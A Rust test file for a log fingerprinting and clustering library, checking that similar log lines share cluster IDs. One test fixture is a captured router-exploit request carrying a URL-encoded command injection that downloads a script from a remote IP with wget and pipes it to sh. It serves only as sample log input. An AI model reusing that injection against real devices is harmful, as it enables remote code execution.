// Copyright 2025 CardinalHQ, Inc.
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU Affero General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU Affero General Public License for more details.
//
// You should have received a copy of the GNU Affero General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.

//! Clustering tests ported from Go trie_cluster_manager_test.go.

use crate::log_fingerprint::cluster::TrieClusterManager;
use crate::log_fingerprint::Fingerprinter;

/// Helper to fingerprint with clustering.
fn fingerprint_with_clustering(
    fp: &Fingerprinter,
    cm: &TrieClusterManager,
    input: &str,
) -> i64 {
    let (tokens, _level, json_keys) = fp.tokenize_input(input).unwrap();
    let json_keys_ref = json_keys.as_ref().map(|v| v.as_slice()).unwrap_or(&[]);
    cm.cluster(&tokens, json_keys_ref)
}

/// Test from Go: TestSimpleClustering
#[test]
fn test_simple_clustering() {
    let messages = vec![
        "Error reading file from path /var/logs/app.log",
        "Error reading file from path /usr/logs/app.log",
        "Failed to connect to database at db-server",
        "Connection error to database at db-server",
    ];

    let cm = TrieClusterManager::new(0.5);
    let fp = Fingerprinter::with_max_tokens(50);

    let fps: Vec<i64> = messages
        .iter()
        .map(|m| fingerprint_with_clustering(&fp, &cm, m))
        .collect();

    // First two should share a cluster
    assert_eq!(fps[0], fps[1], "msgs 0&1 should be same cluster");
    // Last two should share a different cluster
    assert_eq!(fps[2], fps[3], "msgs 2&3 should be same cluster");
    // Cross-cluster fingerprints differ
    assert_ne!(fps[0], fps[2], "clusters 0/1 vs 2/3 should differ");
}

/// Test from Go: TestEnvoyAccessLogClustering
#[test]
fn test_envoy_access_log_clustering() {
    let messages = vec![
        r#"[2025-01-15T01:37:14.008Z] "GET /search/tickets?account_id=11&page=&per_page=&query=test HTTP/1.1" 200 - via_upstream - "-" 0 2654 40 40 "54.162.8.237,172.25.31.44" "Typhoeus - https://github.com/typhoeus/typhoeus" "1e967019-52c7-410f-8d9c-cbb27e097f87" "search-service.freshstatus-sta91ng.io" "172.25.29.139:8181" outbound|80|BLUE|aiops-search.ams-aiops-search-staging.svc.cluster.local 172.25.27.204:33730 172.25.27.204:8080 172.25.31.44:9664 - -"#,
        r#"[2025-01-15T01:47:22.192Z] "POST /freshservice/bulk HTTP/1.1" 204 - via_upstream - "-" 1305 0 2 1 "-" "-" "b4d36036-5a5c-4444-a34e-8e628bfc869e" "internal-haystack-write-1499015305.us-east-1.elb.amazonaws.com:8080" "10.98.1.150:8080" PassthroughCluster 172.25.26.133:43784 10.98.1.150:8080 172.25.26.133:48440 - allow_any"#,
        r#"[2025-01-15T01:47:18.753Z] "GET /fcp/alb-health HTTP/1.1" 200 - via_upstream - "-" 0 0 0 0 "172.25.17.113" "ELB-HealthChecker/2.0" "98484ab4-2201-49e9-b99d-4af5427cc1c8" "172.25.27.204:8080" "172.25.27.204:15021" outbound|15021||istio-ingressgateway.istio-system.svc.cluster.local 172.25.27.204:44742 172.25.27.204:8080 172.25.17.113:28198 - -"#,
        r#"[2025-01-15T01:42:16.994Z] "GET /tickets HTTP/1.1" 200 - via_upstream - "-" 0 8443 1156 1155 "54.162.8.237,172.25.17.113" "Ruby" "59fb30b6-62e0-4ec3-940c-4c0eecda3c3e" "aiops-test10.freshstatus-sta91ng.io" "172.25.26.133:8181" inbound|8181|| 127.0.0.6:52821 172.25.26.133:8181 172.25.17.113:0 outbound_.80_.blue_.aiops-tickets.ams-aiops-tickets-staging.svc.cluster.local default"#,
        r#"[2025-01-15T01:47:27.309Z] "GET /metrics HTTP/1.1" 200 - via_upstream - "-" 0 2260 1 1 "-" "Prometheus/v0.18.2" "93068269-58a4-4258-a451-ff9ec522ab20" "172.25.26.133:9394" "172.25.26.133:9394" inbound|9394|| 127.0.0.6:54671 172.25.26.133:9394 172.25.26.165:36862 - default"#,
        r#"[2025-01-15T01:47:27.309Z] "GET /metrics HTTP/1.1" 200 - via_upstream - "-" 0 2260 1 1 "-" "Prometheus/v0.18.2" "93068269-58a4-4258-a451-ff9ec522ab20" "172.25.26.133:9394" "172.25.26.133:9394" inbound|9394|| 127.0.0.6:54671 172.25.26.133:9394 172.25.26.165:36862 - default"#,
        r#"[2025-01-15T01:47:27.309Z] "GET /metrics HTTP/1.1" 200 - via_upstream - "-" 0 2260 1 1 "-" "Prometheus/v0.18.2" "93068269-58a4-4258-a451-ff9ec522ab20" "172.25.26.133:9394" "172.25.26.133:9394" inbound|9394|| 127.0.0.6:54671 172.25.26.133:9394 172.25.26.165:36862 - default"#,
    ];

    let cm = TrieClusterManager::new(0.5);
    let fp = Fingerprinter::with_max_tokens(50);

    let fps: Vec<i64> = messages
        .iter()
        .map(|m| fingerprint_with_clustering(&fp, &cm, m))
        .collect();

    // All messages should have the same fingerprint (clustered together)
    assert_eq!(fps[0], fps[1], "msgs 0&1 should be same cluster");
    assert_eq!(fps[0], fps[2], "msgs 0&2 should be same cluster");
    assert_eq!(fps[0], fps[3], "msgs 0&3 should be same cluster");
    assert_eq!(fps[0], fps[4], "msgs 0&4 should be same cluster");
    assert_eq!(fps[0], fps[5], "msgs 0&5 should be same cluster");
    assert_eq!(fps[0], fps[6], "msgs 0&6 should be same cluster");
}

/// Test from Go: TestClusteringOnReadingGlob
#[test]
fn test_clustering_on_reading_glob() {
    let messages = vec![
        r#"[ceb1f20]Error in reading glob, sql = SELECT * FROM (SELECT * FROM read_parquet(['./db/415c9d63-5d29-4b7a-92ac-5c2c7ba0d672/chq-ccstats/20241219/metrics/21/tbl_15602004457141.parquet', './db/415c9d63-5d29-4b7a-92ac-5c2c7ba0d672/chq-ccstats/20241219/metrics/21/tbl_15301210694110.parquet'], union_by_name=True) WHERE "_cardinalhq.timestamp" > 1734643100000 AND "_cardinalhq.timestamp" <= 1734643840000) WHERE ((( "_cardinalhq.name" = 'ruby.http.request.duration.seconds' and "resource.service.name" = 'api') and "metric.app" = 'aiops-ams') and "_cardinalhq.telemetry_type" = 'metrics') java.sql.SQLException: Binder Error: Referenced column "metric.app" not found in FROM clause!"#,
        r#"[786a039]Error in reading glob, sql = SELECT "metric.app" as "metric.app", COUNT(*) AS count FROM read_parquet(['./db/415c9d63-5d29-4b7a-92ac-5c2c7ba0d672/chq-ccstats/20241219/metrics/21/tbl_14547073845256.parquet', './db/415c9d63-5d29-4b7a-92ac-5c2c7ba0d672/chq-ccstats/20241219/metrics/21/tbl_14641144825111.parquet'], union_by_name=True) WHERE ((" _cardinalhq.name" = 'ruby.http.requests.total' and "_cardinalhq.telemetry_type" = 'metrics') and "metric.app" IS NOT NULL) AND "_cardinalhq.timestamp" > 1734642320000 AND "_cardinalhq.timestamp" <= 1734643060000 GROUP BY "metric.app" java.sql.SQLException: Binder Error: Referenced column "metric.app" not found in FROM clause! Candidate bindings: "read_parquet.metric.data_type", "read_parquet.metric.transport", "read_parquet.metric.signal" LINE 1: SELECT "metric.app" as "metric.app", COUNT(*) ..."#,
    ];

    let cm = TrieClusterManager::new(0.5);
    let fp = Fingerprinter::with_max_tokens(50);

    let fps: Vec<i64> = messages
        .iter()
        .map(|m| fingerprint_with_clustering(&fp, &cm, m))
        .collect();

    // All messages should have the same fingerprint
    assert_eq!(fps[0], fps[1], "msgs 0&1 should be same cluster");
}

/// Test from Go: TestClusteringOnLorenIpsum
#[test]
fn test_clustering_on_lorem_ipsum() {
    let messages = vec![
        "[de5515ba-98a0-4c1d-be32-ae61152cb0b8]   \x1b[1m\x1b[36mTicket Create (1.8ms)\x1b[0m  \x1b[1m\x1b[32mINSERT INTO `tickets` (`title`, `description`, `external_id`, `account_id`, `created_at`, `updated_at`) VALUES ('Et dignissimos debitis voluptatum.', 'Omnis dolor error. Deleniti sint hic. Labore omnis id.', 585378, 11, '2025-01-13 17:42:43.050272', '2025-01-13 17:42:43.050272')\x1b[0m",
        "[5b3d31c9-7fc8-4b4b-a38f-b0bcf82434a6]   \x1b[1m\x1b[36mTicket Create (1.6ms)\x1b[0m  \x1b[1m\x1b[32mINSERT INTO `tickets` (`title`, `description`, `external_id`, `account_id`, `created_at`, `updated_at`) VALUES ('Occaecati illum voluptas quibusdam.', 'Excepturi tenetur non. Ullam incidunt expedita. Explicabo earum reiciendis.', 584719, 11, '2025-01-13 07:03:52.694513', '2025-01-13 07:03:52.694513')\x1b[0m",
        "[5d8d83e3-d52c-461e-8c7c-4b10eab2a159]   \x1b[1m\x1b[36mTicket Create (1.7ms)\x1b[0m  \x1b[1m\x1b[32mINSERT INTO `tickets` (`title`, `description`, `external_id`, `account_id`, `created_at`, `updated_at`) VALUES ('Est sit itaque illum.', 'Aliquam assumenda consequatur. Porro doloribus perspiciatis. Illum cumque voluptate.', 584482, 11, '2025-01-13 03:04:32.161775', '2025-01-13 03:04:32.161775')\x1b[0m",
        "[1a56410f-a24d-4a6b-aad9-dd4267069f20]   \x1b[1m\x1b[36mTicket Create (1.7ms)\x1b[0m  \x1b[1m\x1b[32mINSERT INTO `tickets` (`title`, `description`, `external_id`, `account_id`, `created_at`, `updated_at`) VALUES ('Quis beatae enim iste.', 'Reprehenderit voluptas rem. Porro cupiditate amet. Atque recusandae eius.', 585360, 11, '2025-01-13 17:28:12.478078', '2025-01-13 17:28:12.478078')\x1b[0m",
        "[1a41a6cb-28e9-4806-a40b-822a38fb4630]   \x1b[1m\x1b[36mTicket Create (1.6ms)\x1b[0m  \x1b[1m\x1b[32mINSERT INTO `tickets` (`title`, `description`, `external_id`, `account_id`, `created_at`, `updated_at`) VALUES ('Dignissimos repellendus et quam.', 'Minima laboriosam aut. Quas sapiente ut. Facilis ipsa animi.', 585165, 11, '2025-01-13 14:07:36.160576', '2025-01-13 14:07:36.160576')\x1b[0m",
    ];

    let cm = TrieClusterManager::new(0.5);
    let fp = Fingerprinter::with_max_tokens(50);

    let fps: Vec<i64> = messages
        .iter()
        .map(|m| fingerprint_with_clustering(&fp, &cm, m))
        .collect();

    // All messages should have the same fingerprint
    assert_eq!(fps[0], fps[1], "msgs 0&1 should be same cluster");
    assert_eq!(fps[0], fps[2], "msgs 0&2 should be same cluster");
    assert_eq!(fps[0], fps[3], "msgs 0&3 should be same cluster");
    assert_eq!(fps[0], fps[4], "msgs 0&4 should be same cluster");
}

/// Test from Go: TestPartialPrefixDivergence
#[test]
fn test_partial_prefix_divergence() {
    let cm = TrieClusterManager::new(0.8);
    let fp = Fingerprinter::with_max_tokens(50);

    let fp1 = fingerprint_with_clustering(&fp, &cm, "foo bar baz qux");
    let fp2 = fingerprint_with_clustering(&fp, &cm, "foo bar baz quux");

    // Share prefix "foo bar baz" but differ at the end
    // With high threshold (0.8), should be distinct clusters
    assert_ne!(fp1, fp2, "should be distinct clusters under the same subtrie");
}

/// Test fingerprint identicality - similar logs with different IDs should cluster.
#[test]
fn test_fingerprint_identicality_simple() {
    let messages = vec![
        "INFO Received request for /api/v1/endpoint from userId=65431",
        "INFO Received request for /api/v1/endpoint from userId=12345",
    ];

    let cm = TrieClusterManager::new(0.5);
    let fp = Fingerprinter::new();

    let fp1 = fingerprint_with_clustering(&fp, &cm, messages[0]);
    let fp2 = fingerprint_with_clustering(&fp, &cm, messages[1]);

    assert_eq!(fp1, fp2, "similar logs should have same fingerprint");
}

/// Test fingerprint identicality - URL paths with different params should cluster.
#[test]
fn test_fingerprint_identicality_url_paths() {
    let messages = vec![
        r#"[a0b0fa04-0423-4760-8757-cb0dc85f90d4] Started GET "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60)" for 31.220.1.144 at 2025-01-13 17:26:27 +0000"#,
        r#"[703060d9-20ef-4b3e-b161-65c637c4d88b] Started GET "/api/index.php/v1/config/application?public=true&page%5Boffset%5D=0&page%5Blimit%5D=60" for 66.63.187.168 at 2025-01-13 07:48:20 +0000"#,
        r#"[482cab3b-ad79-4988-8fd7-0bf618489cd2] Started GET "/tickets/search?query=test" for 54.162.8.237 at 2025-01-13 18:10:58 +0000"#,
    ];

    let cm = TrieClusterManager::new(0.5);
    let fp = Fingerprinter::with_max_tokens(25);

    let fps: Vec<i64> = messages
        .iter()
        .map(|m| fingerprint_with_clustering(&fp, &cm, m))
        .collect();

    // All should cluster together
    assert_eq!(fps[0], fps[1], "msgs 0&1 should cluster");
    assert_eq!(fps[0], fps[2], "msgs 0&2 should cluster");
}

/// Test that clustering is thread-safe.
#[test]
fn test_clustering_thread_safety() {
    use std::sync::Arc;
    use std::thread;

    let cm = Arc::new(TrieClusterManager::new(0.5));
    let fp = Arc::new(Fingerprinter::new());

    let messages = vec![
        "Error reading file from path /var/logs/app.log",
        "Error reading file from path /usr/logs/app.log",
        "Error reading file from path /tmp/logs/app.log",
    ];

    let handles: Vec<_> = (0..4)
        .map(|_| {
            let cm = Arc::clone(&cm);
            let fp = Arc::clone(&fp);
            let msgs = messages.clone();
            thread::spawn(move || {
                let mut fps = Vec::new();
                for msg in msgs {
                    let (tokens, _level, json_keys) = fp.tokenize_input(&msg).unwrap();
                    let json_keys_ref = json_keys.as_ref().map(|v| v.as_slice()).unwrap_or(&[]);
                    fps.push(cm.cluster(&tokens, json_keys_ref));
                }
                fps
            })
        })
        .collect();

    let results: Vec<Vec<i64>> = handles.into_iter().map(|h| h.join().unwrap()).collect();

    // All threads should get the same fingerprint for each message
    for i in 0..messages.len() {
        let first = results[0][i];
        for thread_results in &results[1..] {
            assert_eq!(first, thread_results[i], "thread-safety violation at message {}", i);
        }
    }
}
